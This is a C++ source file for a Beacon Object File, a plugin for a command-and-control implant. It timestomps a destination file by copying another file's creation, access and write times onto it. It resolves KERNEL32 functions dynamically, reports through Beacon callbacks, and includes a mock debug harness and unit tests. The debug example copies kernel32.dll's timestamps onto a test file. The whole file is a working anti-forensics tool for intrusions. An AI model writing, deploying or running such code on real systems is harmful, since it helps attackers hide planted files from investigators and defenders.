#include <Windows.h>
#include "..\Core\base\helpers.h"

/**
 * For the debug build we want:
 *   a) Include the mock-up layer
 *   b) Undefine DECLSPEC_IMPORT since the mocked Beacon API
 *      is linked against the the debug build.
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "..\Core\base\mock.h"
#endif

#if defined(_GTEST)
#include <gtest\gtest.h>
using m_TimeStompFile = bool(*)(char* srcFile, char* destFile);

m_TimeStompFile TimeStompFile = nullptr;
//bool TimeStompFile(char* srcFile, char* destFile)
class MockedFunctions : public ::testing::Test {
protected:
	void SetUp() override {
		TimeStompFile = [](char* srcFile, char* destFile) -> bool {
			return true; // Mocked function always returns false
			};
	}
	void TearDown() override {
		TimeStompFile = nullptr;
	}
};
#else
#include "..\Core\beacon.h"
#include "..\Core\sleepmask.h"

extern "C" {
	DFR(KERNEL32, GetFileTime);
	DFR(KERNEL32, SetFileTime);
	DFR(KERNEL32, CreateFileA);
	DFR(KERNEL32, CloseHandle);
	DFR(KERNEL32, GetLastError);
}
#define GetFileTime KERNEL32$GetFileTime
#define SetFileTime KERNEL32$SetFileTime
#define CreateFileA KERNEL32$CreateFileA
#define CloseHandle KERNEL32$CloseHandle
#define GetLastError KERNEL32$GetLastError

bool TimeStompFile(char* srcFile, char* destFile) {
	FILETIME creationTime, lastAccessTime, lastWriteTime;

	// Step 1: Open source file to read timestamps
	HANDLE hSource = CreateFileA(
		srcFile,
		GENERIC_READ,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hSource == INVALID_HANDLE_VALUE) {
		return false;
	}

	// Step 2: Get timestamps from source file
	BOOL getResult = GetFileTime(hSource, &creationTime, &lastAccessTime, &lastWriteTime);
	CloseHandle(hSource);

	if (!getResult) {
		return false;
	}

	// Step 3: Open destination file with write attributes permission
	HANDLE hDest = CreateFileA(
		destFile,
		FILE_WRITE_ATTRIBUTES,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDest == INVALID_HANDLE_VALUE) {
		return false;
	}

	// Step 4: Set timestamps on destination file
	BOOL setResult = SetFileTime(hDest, &creationTime, &lastAccessTime, &lastWriteTime);
	CloseHandle(hDest);

	if (!setResult) {
		return false;
	}

	return true;
}

#endif

extern "C" {
	void go(char* args, int len) {
		datap parser;
		BeaconDataParse(&parser, args, len);
		char* copyFile = BeaconDataExtract(&parser, &len);
		char* destFile = BeaconDataExtract(&parser, &len);
			
		if (TimeStompFile(copyFile, destFile)) {
			BeaconPrintf(CALLBACK_OUTPUT, "TimeStomped file successfully.");
		}
		else {
			BeaconPrintf(CALLBACK_ERROR, "Failed to TimeStomp file. Error: %d", GetLastError());
		}
	}

	/*
	void sleep_mask(PSLEEPMASK_INFO info, PFUNCTION_CALL funcCall) {
	}
	*/
}

// Define a main function for the bebug build
#if defined(_DEBUG) && !defined(_GTEST)

int main(int argc, char* argv[]) {
	// Run BOF's entrypoint
	// To pack arguments for the bof use e.g.: bof::runMocked<int, short, const char*>(go, 6502, 42, "foobar");
	bof::runMocked<>(go, "C:\\Windows\\system32\\kernel32.dll","C:\\Temp\\test.txt");

	return 0;
}

// Define unit tests
#elif defined(_GTEST)
#include <gtest\gtest.h>

namespace UnitTest{
	TEST_F(MockedFunctions, TimeStompFailed) {
		TimeStompFile = [](char* x, char* y) -> bool {return false; };

		std::vector<bof::output::OutputEntry> got =
			bof::runMocked<>(go, "C:\\Temp\\mockFile1.txt", "C:\\Temp\\mockFile2.txt");
		bof::output::OutputEntry expected = 
		{ CALLBACK_ERROR, "Failed to TimeStomp file. Error: 0" };

		ASSERT_EQ(expected.callbackType, got.back().callbackType);
	}

	TEST_F(MockedFunctions, TimeStompSuccess) {
		std::vector<bof::output::OutputEntry> got =
			bof::runMocked<>(go, "C:\\Temp\\mockFile1.txt", "C:\\Temp\\mockFile2.txt");

		ASSERT_EQ(CALLBACK_OUTPUT, got.back().callbackType);
	}
}
#endif